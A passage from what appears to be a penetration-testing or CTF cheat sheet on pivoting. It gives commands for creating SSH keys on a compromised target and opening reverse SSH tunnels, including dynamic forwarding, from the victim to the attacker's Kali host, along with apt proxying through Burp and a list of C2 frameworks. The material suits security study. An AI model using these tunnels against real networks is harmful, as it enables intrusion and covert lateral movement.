-o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" 
# Create SSH keys on the target
cd /tmp
mkdir keys
cd keys
ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/var/www/.ssh/id_rsa): /tmp/keys/id_rsa
...
cat id_rsa.pub
ssh-rsa ... www-data@hostname #www-data is just an example of any user
# We copy that public key but adding restrictions:
# - only permitting access coming from that victim specific IP (public/NAT)
from="10.11.1.0"
# ignore any commands the user supplies
command="echo 'This account can only be used for port forwarding'"
# prevent agent and X11 forwarding
no-agent-forwarding,no-X11-forwarding
# prevent the user from being allocated a tty device
no-pty
# So this would be the final ~/.ssh/authorized_keys file on Kali
from="10.11.1.0",command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa AAAAB3NzaC1... www-data@hostname
# If we need a reverse tunnel, this is a possible command
ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa kali@192.168.1.10
# -f to tunnel on the background /// -N to say we are not running any commands /// -i to provide the key file

# --------------------IN CASE SSH VERSION IS RECENT ENOUGH TO DO REVERSE DYNAMIC PORT FORWARDING, SAME STEPS AND THIS COMMAND
ssh -f -N -R 1080 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /var/lib/mysql/.ssh/id_rsa kali@192.168.0.10
```
{% endcode %}

## Installing packages on compromised targets

If you need to install Linux packages (such as Python 2) on compromised targets and you do not have Internet access on the target but you do on Kali, you can configure **apt** on the target to use Burp on Kali as the HTTP proxy. Do note that for this to work you need Burp to listen on all interfaces or at least the interface accessible to the target. See the [last point here](https://ivanitlearning.wordpress.com/2021/06/18/how-i-use-burpsuite/).\


```
root@pivot:~/CTF/Box# export http_proxy=http://192.168.119.170:8081
root@pivot:~/CTF/Box# apt update
```

## nmap on pivot boxes

Use a static nmap binary on the target [https://github.com/ernw/static-toolbox](https://github.com/ernw/static-toolbox)

## C2 - Command & control&#x20;

With a foothold in a target network, we can start looking to bring what is known as a C2 (Command and Control) Framework into play. C2 Frameworks are used to consolidate an attacker's position within a network and simplify post-exploitation steps (privesc, AV evasion, pivoting, looting, covert network tactics, etc), as well as providing red teams with extensive collaboration features. There are many C2 Frameworks available. The most famous (and expensive) is likely [Cobalt Strike](https://www.cobaltstrike.com/); however, there are many others, including the .NET based [Covenant](https://github.com/cobbr/Covenant), [Merlin](https://github.com/Ne0nd0g/merlin), [Shadow](https://github.com/bats3c/shad0w), [PoshC2](https://github.com/nettitude/PoshC2), and many others. An excellent resource for finding (and filtering) C2 frameworks is [The C2 Matrix](https://www.thec2matrix.com/), which provides a great list of the pros and cons of a huge number of frameworks.

## References

* [https://www.synacktiv.com/publications/traces-of-windows-remote-command-execution.html](https://www.synacktiv.com/publications/traces-of-windows-remote-command-execution.html)
* [https://neil-fox.github.io/Impacket-usage-&-detection/](https://neil-fox.github.io/Impacket-usage-&-detection/)
